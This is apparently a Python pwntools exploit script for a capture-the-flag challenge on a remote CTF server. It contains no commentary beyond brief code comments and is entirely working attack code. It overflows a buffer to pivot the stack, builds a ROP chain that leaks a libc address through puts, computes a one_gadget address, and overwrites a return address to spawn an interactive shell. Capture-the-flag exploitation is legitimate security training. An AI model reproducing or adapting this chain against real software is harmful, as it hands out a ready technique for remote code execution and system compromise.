from pwn import *
import time

r = remote("ctf.adl.tw", 11006)
# r = remote("127.0.0.1", 8888)
context.arch = "amd64"

buf = 0x601280
puts_plt = 0x400530
puts_got = 0x601018
puts_off = 0x6f690
one_gadget_off = 0x4526a

pop_rdi = 0x400773
leave_ret = 0x40070a

# raw_input('aaa')

# mov $rbp higher 
payload1 = "a" * 0x30 + flat([buf, 0x4006bf])
r.sendafter("\n", payload1)
r.recvuntil("\n")
r.recvuntil("\n")

# leak libc address
payload2 = flat([buf, pop_rdi, puts_got, puts_plt, 0x4006bf, 0, buf-0x30, leave_ret])
r.send(payload2)
r.recvuntil("\n")
r.recvuntil("\n")
libc = u64(r.recv(6).ljust(8, "\x00")) - puts_off
one_gadget = libc + one_gadget_off

# overwrite return address of read() -> get shell
payload3 = flat([0, 0, 0, 0, one_gadget, 0, 0, 0])
r.send(payload3)

r.interactive()

